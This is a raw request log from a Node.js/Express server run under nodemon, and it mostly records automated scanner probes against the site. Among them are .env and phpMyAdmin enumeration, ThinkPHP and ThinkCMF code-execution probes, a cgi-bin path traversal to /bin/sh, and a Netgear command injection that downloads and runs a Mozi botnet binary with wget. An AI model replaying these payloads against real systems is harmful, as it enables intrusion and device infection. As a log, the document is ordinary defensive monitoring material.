
> packachange@1.0.0 server
> nodemon server.js --ignore frontend_react

[33m[nodemon] 2.0.15[39m
[33m[nodemon] to restart at any time, enter `rs`[39m
[33m[nodemon] watching path(s): *.*[39m
[33m[nodemon] watching extensions: js,mjs,json[39m
[32m[nodemon] starting `node server.js`[39m
Server is running on port 80
[0mGET /admin/.env [32m200[0m 1.040 ms - 2460[0m
[0mGET /laravel/.env [32m200[0m 0.748 ms - 2460[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200[0m 1.187 ms - 2460[0m
[0mGET /solr/admin/info/system?wt=json [32m200[0m 1.079 ms - 2460[0m
[0mGET /.env [32m200[0m 0.836 ms - 2460[0m
[0mPOST / [33m404[0m 6133.259 ms - 140[0m
[0mGET /phpmyadmin/scripts/setup.php [32m200[0m 1.030 ms - 2460[0m
[0mGET / [32m200[0m 0.942 ms - 2460[0m
[0mGET / [32m200[0m 0.740 ms - 2460[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 [32m200[0m 1.308 ms - 2460[0m
[0mGET / [32m200[0m 0.892 ms - 2460[0m
[0mGET / [32m200[0m 1.088 ms - 2460[0m
[0mPOST / [33m404[0m 0.476 ms - 140[0m
[0mGET /.env [32m200[0m 0.901 ms - 2460[0m
[0mGET / [32m200[0m 0.875 ms - 2460[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [32m200[0m 0.866 ms - 2460[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200[0m 0.714 ms - 2460[0m
[0mGET /console/ [32m200[0m 3.195 ms - 2460[0m
[0mGET / [32m200[0m 0.843 ms - 2460[0m
[0mGET / [32m200[0m 0.875 ms - 2460[0m
[0mGET /./favicon.ico [32m200[0m 0.827 ms - 3870[0m
[0mPOST /Autodiscover/Autodiscover.xml [33m404[0m 0.631 ms - 169[0m
[0mGET http://azenv.net/ [32m200[0m 1.533 ms - 2460[0m
[0mGET /.env [32m200[0m 0.894 ms - 2460[0m
[0mPOST / [33m404[0m 3.262 ms - 140[0m
[0mGET /.env [32m200[0m 0.971 ms - 2460[0m
[0mPOST / [33m404[0m 0.542 ms - 140[0m
[0mGET / [32m200[0m 0.851 ms - 2460[0m
[0mPOST / [33m404[0m 0.500 ms - 140[0m
[0mGET /.env [32m200[0m 1.093 ms - 2460[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [32m200[0m 1.163 ms - 2460[0m
[0mGET / [32m200[0m 0.698 ms - 2460[0m
[0mGET /hudson [32m200[0m 1.002 ms - 2460[0m
[0mGET / [32m200[0m 0.827 ms - 2460[0m
[0mGET / [32m200[0m 0.681 ms - 2460[0m
[0mGET /.env [32m200[0m 1.027 ms - 2460[0m
[0mPOST / [33m404[0m 0.482 ms - 140[0m
[0mGET /.env [32m200[0m 0.898 ms - 2460[0m
[0mPOST / [33m404[0m 1030.773 ms - 140[0m
[0mGET /.env [32m200[0m 1.287 ms - 2460[0m
[0mGET /phpmyadmin/scripts/setup.php [32m200[0m 6.532 ms - 2460[0m
[0mGET /wp-content/ [32m200[0m 1.114 ms - 2460[0m
[0mGET / [32m200[0m 0.724 ms - 2460[0m
[0mGET /config/getuser?index=0 [32m200[0m 3.352 ms - 2460[0m
[0mPOST / [33m404[0m 0.449 ms - 140[0m
[0mGET /.env [32m200[0m 0.873 ms - 2460[0m
[0mGET /_profiler/phpinfo [32m200[0m 1.134 ms - 2460[0m
[0mGET /debug/default/view?panel=config [32m200[0m 1.011 ms - 2460[0m
[0mGET / [32m200[0m 4.296 ms - 2460[0m
[0mGET / [32m200[0m 0.686 ms - 2460[0m
[0mGET /config/getuser?index=0 [32m200[0m 1.001 ms - 2460[0m
[0mGET /.env [32m200[0m 0.889 ms - 2460[0m
[0mPOST / [33m404[0m 4642.623 ms - 140[0m
[0mGET /.env [32m200[0m 1.203 ms - 2460[0m
[0mPOST /.env [33m404[0m 5.350 ms - 144[0m
[0mGET / [32m200[0m 0.847 ms - 2460[0m
[0mGET /wp-includes/wlwmanifest.xml [32m200[0m 0.947 ms - 2460[0m
[0mGET /xmlrpc.php?rsd [32m200[0m 0.853 ms - 2460[0m
[0mGET / [32m200[0m 0.935 ms - 2460[0m
[0mGET /blog/wp-includes/wlwmanifest.xml [32m200[0m 1.022 ms - 2460[0m
[0mGET /web/wp-includes/wlwmanifest.xml [32m200[0m 1.273 ms - 2460[0m
[0mGET /wordpress/wp-includes/wlwmanifest.xml [32m200[0m 1.061 ms - 2460[0m
[0mGET /website/wp-includes/wlwmanifest.xml [32m200[0m 3.746 ms - 2460[0m
[0mGET /wp/wp-includes/wlwmanifest.xml [32m200[0m 1.158 ms - 2460[0m
[0mGET /news/wp-includes/wlwmanifest.xml [32m200[0m 1.179 ms - 2460[0m
[0mGET /2015/wp-includes/wlwmanifest.xml [32m200[0m 1.026 ms - 2460[0m
[0mGET /2016/wp-includes/wlwmanifest.xml [32m200[0m 1.100 ms - 2460[0m
[0mGET /2017/wp-includes/wlwmanifest.xml [32m200[0m 1.025 ms - 2460[0m
[0mGET /2018/wp-includes/wlwmanifest.xml [32m200[0m 1.146 ms - 2460[0m
[0mGET /shop/wp-includes/wlwmanifest.xml [32m200[0m 1.730 ms - 2460[0m
[0mGET /wp1/wp-includes/wlwmanifest.xml [32m200[0m 1.274 ms - 2460[0m
[0mGET /test/wp-includes/wlwmanifest.xml [32m200[0m 1.064 ms - 2460[0m
[0mGET /media/wp-includes/wlwmanifest.xml [32m200[0m 1.171 ms - 2460[0m
[0mGET /wp2/wp-includes/wlwmanifest.xml [32m200[0m 1.270 ms - 2460[0m
[0mGET /site/wp-includes/wlwmanifest.xml [32m200[0m 0.927 ms - 2460[0m
[0mGET /cms/wp-includes/wlwmanifest.xml [32m200[0m 0.921 ms - 2460[0m
[0mGET /sito/wp-includes/wlwmanifest.xml [32m200[0m 1.128 ms - 2460[0m
[0mGET /config/getuser?index=0 [32m200[0m 1.020 ms - 2460[0m
[0mGET /ab2g [32m200[0m 0.838 ms - 2460[0m
[0mGET /ab2h [32m200[0m 1.107 ms - 2460[0m
[0mPOST / [33m404[0m 0.704 ms - 140[0m
[0mGET /.env [32m200[0m 1.180 ms - 2460[0m
[0mGET / [32m200[0m 1.645 ms - 2460[0m
[0mGET / [32m200[0m 1.019 ms - 2460[0m
[0mGET / [32m200[0m 0.807 ms - 2460[0m
[0mGET / [32m200[0m 1.363 ms - 2460[0m
[0mGET /fuel [32m200[0m 1.196 ms - 2460[0m
[0mGET / [32m200[0m 0.679 ms - 2460[0m
[0mGET /portal/redlion [32m200[0m 0.901 ms - 2460[0m
[0mGET / [32m200[0m 1.038 ms - 2460[0m
[0mGET / [32m200[0m 0.770 ms - 2460[0m
[0mPOST / [33m404[0m 0.387 ms - 140[0m
[0mGET /.env [32m200[0m 1.164 ms - 2460[0m
[0mGET / [32m200[0m 0.815 ms - 2460[0m
[0mHEAD / [32m200[0m 0.564 ms - 2460[0m
[0mGET /.env [32m200[0m 4.181 ms - 2460[0m
[0mPOST / [33m404[0m 0.317 ms - 140[0m
[0mGET / [32m200[0m 0.877 ms - 2460[0m
[0mGET /BVuQpLKJejWD6MZTsng8bclUiAb [32m200[0m 1.124 ms - 2460[0m
[0mGET / [32m200[0m 0.793 ms - 2460[0m
[0mGET /static/css/2.b5378863.chunk.css [32m200[0m 0.908 ms - 49051[0m
[0mGET /static/js/2.b5907e94.chunk.js [36m304[0m 1.087 ms - -[0m
[0mGET /static/js/main.42ef36c3.chunk.js [36m304[0m 0.810 ms - -[0m
[0mGET /static/media/data_model.835a9af9.png [36m304[0m 0.689 ms - -[0m
[0mGET /config/getuser?index=0 [32m200[0m 1.309 ms - 2460[0m
[0mGET / [32m200[0m 0.755 ms - 2460[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200[0m 1.216 ms - 2460[0m
[0mGET / [32m200[0m 2.936 ms - 2460[0m
[0mGET /solr/admin/info/system?wt=json [32m200[0m 0.851 ms - 2460[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 [32m200[0m 1.122 ms - 2460[0m
[0mGET http://azenv.net/ [32m200[0m 0.982 ms - 2460[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200[0m 0.827 ms - 2460[0m
[0mPOST / [33m404[0m 0.399 ms - 140[0m
[0mGET /.env [32m200[0m 1.473 ms - 2460[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200[0m 0.855 ms - 2460[0m
[0mGET /console/ [32m200[0m 0.753 ms - 2460[0m
[0mGET / [32m200[0m 0.588 ms - 2460[0m
[0mPOST /Autodiscover/Autodiscover.xml [33m404[0m 0.358 ms - 169[0m
[0mGET / [32m200[0m 0.738 ms - 2460[0m
[0mGET / [32m200[0m 0.890 ms - 2460[0m
[0mGET /wp-includes/wlwmanifest.xml [32m200[0m 1.133 ms - 2460[0m
[0mGET /xmlrpc.php?rsd [32m200[0m 8.119 ms - 2460[0m
[0mGET / [32m200[0m 0.704 ms - 2460[0m
[0mGET /blog/wp-includes/wlwmanifest.xml [32m200[0m 0.979 ms - 2460[0m
[0mGET /web/wp-includes/wlwmanifest.xml [32m200[0m 1.034 ms - 2460[0m
[0mGET /wordpress/wp-includes/wlwmanifest.xml [32m200[0m 0.834 ms - 2460[0m
[0mGET /website/wp-includes/wlwmanifest.xml [32m200[0m 1.165 ms - 2460[0m
[0mGET /wp/wp-includes/wlwmanifest.xml [32m200[0m 1.078 ms - 2460[0m
[0mGET /news/wp-includes/wlwmanifest.xml [32m200[0m 1.054 ms - 2460[0m
[0mGET /wp1/wp-includes/wlwmanifest.xml [32m200[0m 1.142 ms - 2460[0m
[0mGET /test/wp-includes/wlwmanifest.xml [32m200[0m 0.808 ms - 2460[0m
[0mGET /wp2/wp-includes/wlwmanifest.xml [32m200[0m 0.814 ms - 2460[0m
[0mGET /site/wp-includes/wlwmanifest.xml [32m200[0m 0.921 ms - 2460[0m
[0mGET /cms/wp-includes/wlwmanifest.xml [32m200[0m 0.814 ms - 2460[0m
[0mGET /sito/wp-includes/wlwmanifest.xml [32m200[0m 0.932 ms - 2460[0m
[0mGET / [32m200[0m 1.171 ms - 2460[0m
[0mGET /_ignition/execute-solution [32m200[0m 0.998 ms - 2460[0m
[0mGET / [32m200[0m 0.795 ms - 2460[0m
[0mGET / [32m200[0m 0.538 ms - 2460[0m
[0mGET /auth/login.html [32m200[0m 1.275 ms - 2460[0m
[0mGET / [32m200[0m 0.861 ms - 2460[0m
[0mGET /phpmyadmin/scripts/setup.php [32m200[0m 0.959 ms - 2460[0m
[0mPOST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh [33m404[0m 0.372 ms - 174[0m
[0mGET /config/getuser?index=0 [32m200[0m 0.951 ms - 2460[0m
[0mGET /.env [32m200[0m 0.823 ms - 2460[0m
[0mGET /.env [32m200[0m 2.702 ms - 2460[0m
[0mGET /.env [32m200[0m 1.087 ms - 2460[0m
[0mPOST /.env [33m404[0m 0.440 ms - 144[0m
[0mGET / [32m200[0m 0.583 ms - 2460[0m
[0mGET / [32m200[0m 0.593 ms - 2460[0m
[0mPOST / [33m404[0m 2.903 ms - 140[0m
[0mGET /.env [32m200[0m 0.993 ms - 2460[0m
[0mGET / [32m200[0m 0.729 ms - 2460[0m
[0mGET /robots.txt [32m200[0m 1.145 ms - 2460[0m
[0mGET / [32m200[0m 0.930 ms - 2460[0m
[0mGET / [32m200[0m 0.765 ms - 2460[0m
[0mGET /.env [32m200[0m 1.304 ms - 2460[0m
[0mGET /db/phpMyAdmin/index.php?lang=en [32m200[0m 0.786 ms - 2460[0m
[0mGET /sql/websql/index.php?lang=en [32m200[0m 1.174 ms - 2460[0m
[0mGET /phpmyadmin_/index.php?lang=en [32m200[0m 4.460 ms - 2460[0m
[0mGET /admin/sysadmin/index.php?lang=en [32m200[0m 0.875 ms - 2460[0m
[0mGET /admin/web/index.php?lang=en [32m200[0m 0.887 ms - 2460[0m
[0mGET /mysql-admin/index.php?lang=en [32m200[0m 3.059 ms - 2460[0m
[0mGET /phpMyAdmin-5.1.1/index.php?lang=en [32m200[0m 0.799 ms - 2460[0m
[0mGET /sql/sqlweb/index.php?lang=en [32m200[0m 0.835 ms - 2460[0m
[0mGET /mysql/pMA/index.php?lang=en [32m200[0m 0.738 ms - 2460[0m
[0mGET /PMA2019/index.php?lang=en [32m200[0m 1.083 ms - 2460[0m
[0mGET /PMA2015/index.php?lang=en [32m200[0m 6.718 ms - 2460[0m
[0mGET /sql/webdb/index.php?lang=en [32m200[0m 1.007 ms - 2460[0m
[0mGET /PMA/index.php?lang=en [32m200[0m 0.916 ms - 2460[0m
[0mGET /mysqladmin/index.php?lang=en [32m200[0m 0.919 ms - 2460[0m
[0mGET /sql/myadmin/index.php?lang=en [32m200[0m 0.856 ms - 2460[0m
[0mGET /phpmyadmin2014/index.php?lang=en [32m200[0m 0.795 ms - 2460[0m
[0mGET /pma2020/index.php?lang=en [32m200[0m 0.727 ms - 2460[0m
[0mGET /db/dbweb/index.php?lang=en [32m200[0m 0.906 ms - 2460[0m
[0mGET /PMA2021/index.php?lang=en [32m200[0m 1.067 ms - 2460[0m
[0mGET /phpmyadmin2017/index.php?lang=en [32m200[0m 0.728 ms - 2460[0m
[0mGET /phpmyadmin_/index.php?lang=en [32m200[0m 0.699 ms - 2460[0m
[0mGET /phpMyAdmin-5/index.php?lang=en [32m200[0m 1.131 ms - 2460[0m
[0mGET /program/index.php?lang=en [32m200[0m 1.014 ms - 2460[0m
[0mGET /pma2014/index.php?lang=en [32m200[0m 0.942 ms - 2460[0m
[0mGET /phpmyadmin2015/index.php?lang=en [32m200[0m 5.733 ms - 2460[0m
[0mGET /admin/pMA/index.php?lang=en [32m200[0m 7.612 ms - 2460[0m
[0mGET /dbadmin/index.php?lang=en [32m200[0m 1.119 ms - 2460[0m
[0mGET /db/webadmin/index.php?lang=en [32m200[0m 0.966 ms - 2460[0m
[0mGET /admin/index.php?lang=en [32m200[0m 0.733 ms - 2460[0m
[0mGET /administrator/db/index.php?lang=en [32m200[0m 0.873 ms - 2460[0m
[0mGET /sql/sqlweb/index.php?lang=en [32m200[0m 5.145 ms - 2460[0m
[0mGET /admin/db/index.php?lang=en [32m200[0m 1.140 ms - 2460[0m
[0mGET /sql/phpMyAdmin2/index.php?lang=en [32m200[0m 1.119 ms - 2460[0m
[0mGET /phppma/index.php?lang=en [32m200[0m 1.156 ms - 2460[0m
[0mGET /db/phpMyAdmin/index.php?lang=en [32m200[0m 1.177 ms - 2460[0m
[0mGET /admin/index.php?lang=en [32m200[0m 1.040 ms - 2460[0m
[0mGET /db/phpMyAdmin3/index.php?lang=en [32m200[0m 1.170 ms - 2460[0m
[0mGET /phpmyadmin2015/index.php?lang=en [32m200[0m 1.273 ms - 2460[0m
[0mGET /phpMyadmin/index.php?lang=en [32m200[0m 1.288 ms - 2460[0m
[0mGET /program/index.php?lang=en [32m200[0m 1.081 ms - 2460[0m
[0mGET /mysql/admin/index.php?lang=en [32m200[0m 1.013 ms - 2460[0m
[0mGET /sql/myadmin/index.php?lang=en [32m200[0m 0.898 ms - 2460[0m
[0mGET /phpMyAdmin-5.1.1/index.php?lang=en [32m200[0m 1.138 ms - 2460[0m
[0mGET /dbadmin/index.php?lang=en [32m200[0m 14.751 ms - 2460[0m
[0mGET /database/index.php?lang=en [32m200[0m 3.652 ms - 2460[0m
[0mGET /db/phpMyAdmin3/index.php?lang=en [32m200[0m 1.261 ms - 2460[0m
[0mGET /db/dbweb/index.php?lang=en [32m200[0m 0.899 ms - 2460[0m
[0mGET /sql/sqlweb/index.php?lang=en [32m200[0m 0.993 ms - 2460[0m
[0mGET /sql/sql/index.php?lang=en [32m200[0m 0.847 ms - 2460[0m
[0mGET /PMA2017/index.php?lang=en [32m200[0m 0.922 ms - 2460[0m
[0mGET /db/phpmyadmin/index.php?lang=en [32m200[0m 5.639 ms - 2460[0m
[0mGET /phpMyadmin/index.php?lang=en [32m200[0m 1.085 ms - 2460[0m
[0mGET /phpMyAdmin1/index.php?lang=en [32m200[0m 0.685 ms - 2460[0m
[0mGET /admin/phpmyadmin/index.php?lang=en [32m200[0m 0.864 ms - 2460[0m
[0mGET /administrator/pma/index.php?lang=en [32m200[0m 0.851 ms - 2460[0m
[0mGET /pma2015/index.php?lang=en [32m200[0m 5.311 ms - 2460[0m
[0mGET /phpMyAdmin-5.1.1/index.php?lang=en [32m200[0m 1.073 ms - 2460[0m
[0mGET /admin/phpMyAdmin/index.php?lang=en [32m200[0m 1.288 ms - 2460[0m
[0mGET /phppma/index.php?lang=en [32m200[0m 0.846 ms - 2460[0m
[0mGET /mysql/web/index.php?lang=en [32m200[0m 1.525 ms - 2460[0m
[0mGET /db/dbadmin/index.php?lang=en [32m200[0m 0.707 ms - 2460[0m
[0mGET /administrator/phpMyAdmin/index.php?lang=en [32m200[0m 1.163 ms - 2460[0m
[0mGET /phpmyadmin2014/index.php?lang=en [32m200[0m 1.012 ms - 2460[0m
[0mGET /sql/phpmyadmin4/index.php?lang=en [32m200[0m 1.607 ms - 2460[0m
[0mGET /phpMyAdmin-5.1.1-english/index.php?lang=en [32m200[0m 1.069 ms - 2460[0m
[0mGET /mysql/index.php?lang=en [32m200[0m 1.025 ms - 2460[0m
[0mGET /mysql/pma/index.php?lang=en [32m200[0m 1.179 ms - 2460[0m
[0mGET /PMA2014/index.php?lang=en [32m200[0m 0.884 ms - 2460[0m
[0mGET /_phpmyadmin/index.php?lang=en [32m200[0m 0.863 ms - 2460[0m
[0mGET /phppma/index.php?lang=en [32m200[0m 3.841 ms - 2460[0m
[0mGET /phpMyAdmin-4.9.7-english/index.php?lang=en [32m200[0m 1.051 ms - 2460[0m
[0mGET /mysql/admin/index.php?lang=en [32m200[0m 1.047 ms - 2460[0m
[0mGET /phpMyAdmin-5.1.1-english/index.php?lang=en [32m200[0m 0.911 ms - 2460[0m
[0mGET /phpmyadmin2015/index.php?lang=en [32m200[0m 0.849 ms - 2460[0m
[0mGET /_phpMyAdmin/index.php?lang=en [32m200[0m 1.122 ms - 2460[0m
[0mGET /db/phpmyadmin/index.php?lang=en [32m200[0m 5.163 ms - 2460[0m
[0mGET /phpmyadmin5/index.php?lang=en [32m200[0m 0.990 ms - 2460[0m
[0mGET /administrator/phpMyAdmin/index.php?lang=en [32m200[0m 1.081 ms - 2460[0m
[0mGET /pma2014/index.php?lang=en [32m200[0m 0.987 ms - 2460[0m
[0mGET /phpmyadmin/index.php?lang=en [32m200[0m 0.808 ms - 2460[0m
[0mGET /phpMyAdmin-4/index.php?lang=en [32m200[0m 1.140 ms - 2460[0m
[0mGET /PMA2017/index.php?lang=en [32m200[0m 0.699 ms - 2460[0m
[0mGET /pma2018/index.php?lang=en [32m200[0m 2.031 ms - 2460[0m
[0mGET /administrator/phpmyadmin/index.php?lang=en [32m200[0m 1.024 ms - 2460[0m
[0mGET /MyAdmin/index.php?lang=en [32m200[0m 2.268 ms - 2460[0m
[0mGET /administrator/pma/index.php?lang=en [32m200[0m 1.586 ms - 2460[0m
[0mGET /pma2019/index.php?lang=en [32m200[0m 1.320 ms - 2460[0m
[0mGET /sql/sqlweb/index.php?lang=en [32m200[0m 1.051 ms - 2460[0m
[0mGET /phpMyAdmin-5.1.0/index.php?lang=en [32m200[0m 8.192 ms - 2460[0m
[0mGET /phpmy-admin/index.php?lang=en [32m200[0m 1.128 ms - 2460[0m
[0mGET /PMA2014/index.php?lang=en [32m200[0m 1.159 ms - 2460[0m
[0mGET /db/dbadmin/index.php?lang=en [32m200[0m 1.036 ms - 2460[0m
[0mGET /administrator/db/index.php?lang=en [32m200[0m 1.040 ms - 2460[0m
[0mGET /phpmyadmin2014/index.php?lang=en [32m200[0m 1.124 ms - 2460[0m
[0mGET /administrator/web/index.php?lang=en [32m200[0m 3.017 ms - 2460[0m
[0mGET /phpMyAdmin_/index.php?lang=en [32m200[0m 0.870 ms - 2460[0m
[0mGET /MyAdmin/index.php?lang=en [32m200[0m 1.079 ms - 2460[0m
[0mGET /admin/sysadmin/index.php?lang=en [32m200[0m 1.054 ms - 2460[0m
[0mGET /phpMyAdmin-4/index.php?lang=en [32m200[0m 0.894 ms - 2460[0m
[0mGET /sql/phpmyadmin3/index.php?lang=en [32m200[0m 1.112 ms - 2460[0m
[0mGET /sql/webdb/index.php?lang=en [32m200[0m 0.737 ms - 2460[0m
[0mGET /administrator/web/index.php?lang=en [32m200[0m 1.169 ms - 2460[0m
[0mGET /db/phpmyadmin/index.php?lang=en [32m200[0m 1.309 ms - 2460[0m
[0mGET /admin/phpMyAdmin/index.php?lang=en [32m200[0m 0.661 ms - 2460[0m
[0mGET /shopdb/index.php?lang=en [32m200[0m 1.268 ms - 2460[0m
[0mGET /db/phpmyadmin/index.php?lang=en [32m200[0m 1.230 ms - 2460[0m
[0mGET /phpMyAdmin-5.1.1/index.php?lang=en [32m200[0m 0.782 ms - 2460[0m
[0mGET /sql/sql-admin/index.php?lang=en [32m200[0m 3.330 ms - 2460[0m
[0mGET /pma2021/index.php?lang=en [32m200[0m 0.990 ms - 2460[0m
[0mGET /phpMyAdmin-4.9.7-english/index.php?lang=en [32m200[0m 1.012 ms - 2460[0m
[0mGET /PMA2017/index.php?lang=en [32m200[0m 0.779 ms - 2460[0m
[0mGET /PMA2021/index.php?lang=en [32m200[0m 1.306 ms - 2460[0m
[0mGET /mysqlmanager/index.php?lang=en [32m200[0m 0.992 ms - 2460[0m
[0mGET /pma2016/index.php?lang=en [32m200[0m 1.046 ms - 2460[0m
[0mGET /db/websql/index.php?lang=en [32m200[0m 0.710 ms - 2460[0m
[0mGET /phpMyAdmin-4.9.7/index.php?lang=en [32m200[0m 0.924 ms - 2460[0m
[0mGET /PMA2020/index.php?lang=en [32m200[0m 0.887 ms - 2460[0m
[0mGET /mysqladmin/index.php?lang=en [32m200[0m 1.164 ms - 2460[0m
[0mGET /phpmyAdmin/index.php?lang=en [32m200[0m 0.904 ms - 2460[0m
[0mGET /db/phpMyAdmin3/index.php?lang=en [32m200[0m 0.968 ms - 2460[0m
[0mGET /_phpMyAdmin/index.php?lang=en [32m200[0m 3.562 ms - 2460[0m
[0mGET /myadmin/index.php?lang=en [32m200[0m 0.994 ms - 2460[0m
[0mGET /sql/phpmyadmin3/index.php?lang=en [32m200[0m 0.892 ms - 2460[0m
[0mGET /administrator/admin/index.php?lang=en [32m200[0m 1.019 ms - 2460[0m
[0mGET /phpMyAdmin-4/index.php?lang=en [32m200[0m 1.082 ms - 2460[0m
[0mGET /administrator/pma/index.php?lang=en [32m200[0m 1.018 ms - 2460[0m
[0mGET /phpmyadmin2014/index.php?lang=en [32m200[0m 4.113 ms - 2460[0m
[0mGET /PMA2015/index.php?lang=en [32m200[0m 1.129 ms - 2460[0m
[0mGET /pma2013/index.php?lang=en [32m200[0m 1.013 ms - 2460[0m
[0mGET /dbadmin/index.php?lang=en [32m200[0m 0.933 ms - 2460[0m
[0mGET /PMA2013/index.php?lang=en [32m200[0m 0.861 ms - 2460[0m
[0mGET /phpmyadmin2017/index.php?lang=en [32m200[0m 1.117 ms - 2460[0m
[0mGET / [32m200[0m 0.948 ms - 2460[0m
[0mGET / [32m200[0m 0.722 ms - 2460[0m
[0mGET / [32m200[0m 0.597 ms - 2460[0m
[0mGET / [32m200[0m 0.684 ms - 2460[0m
[0mGET /robots.txt [32m200[0m 1.083 ms - 2460[0m
[0mGET /static/js/main.42ef36c3.chunk.js [32m200[0m 4.610 ms - 351675[0m
[0mGET /static/js/2.b5907e94.chunk.js [32m200[0m 2.230 ms - 4033778[0m
[0mGET /static/css/2.b5378863.chunk.css [32m200[0m 1.264 ms - 49051[0m
[0mGET / [32m200[0m 0.775 ms - 2460[0m
[0mPOST / [33m404[0m 0.800 ms - 140[0m
[0mGET /.env [32m200[0m 1.577 ms - 2460[0m
[0mGET / [32m200[0m 1.071 ms - 2460[0m
[0mGET / [32m200[0m 0.619 ms - 2460[0m
[0mGET / [32m200[0m 1.225 ms - 2460[0m
[0mGET /auth/login.html [32m200[0m 0.793 ms - 2460[0m
[0mGET /auth/login.html [32m200[0m 0.828 ms - 2460[0m
[0mGET / [32m200[0m 1.029 ms - 2460[0m
[0mGET / [32m200[0m 0.806 ms - 2460[0m
